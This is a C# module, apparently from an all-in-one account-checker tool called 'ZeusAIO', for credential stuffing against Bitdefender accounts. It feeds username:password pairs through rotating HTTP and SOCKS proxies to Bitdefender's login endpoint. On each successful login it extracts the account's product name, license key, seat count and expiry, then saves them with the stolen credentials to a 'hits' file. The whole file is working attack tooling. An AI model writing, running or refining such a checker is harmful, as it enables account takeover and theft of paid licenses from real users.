using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Bitdefender
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            httpRequest.UserAgent = "Mozilla / 5.0(Windows NT 6.3; Win64; x64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 75.0.3770.142 Safari / 537.36";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            httpRequest.AddHeader("referer", "https://my.bitdefender.com/login");
                            string text6 = httpRequest.Get("https://my.bitdefender.com/lv2/account?login=" + s[0] + "&pass=" + s[1] + "&action=login&type=userpass&fp=web").ToString();
                            if (text6.Contains("\"token\""))
                            {
                                string text7 = Parse(text6, "token\": \"", "\"");
                                httpRequest.ClearAllHeaders();
                                httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                                string source = httpRequest.Get("https://my.bitdefender.com/lv2/get_info?login=" + s[0] + "&token=" + text7 + "&fields=serials%2Caccount").ToString();
                                string text8 = Parse(source, "\"product_name\": \"", "\"");
                                string text9 = Parse(source, "\"key\": \"", "\"");
                                string text10 = Parse(source, "max_computers\": ", ",");
                                string text11 = Parse(source, "expire_time\": ", ",");
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Colorful.Console.WriteLine("[HIT] " + s[0] + ":" + s[1] + " | Product: " + text8 + " | License: " + text9 + " | Max Computers: " + text10 + " | Expires: " + text11, Color.Green);
                                }
                                Export.AsResult("/Bitdefender_hits", s[0] + ":" + s[1] + " | Product: " + text8 + " | License: " + text9 + " | Max Computers: " + text10 + " | Expires: " + text11);
                                return false;

                            }
                            else if (text6.Contains("wrong_login"))
                            {
                                break;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }
                        }
                        break;
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}


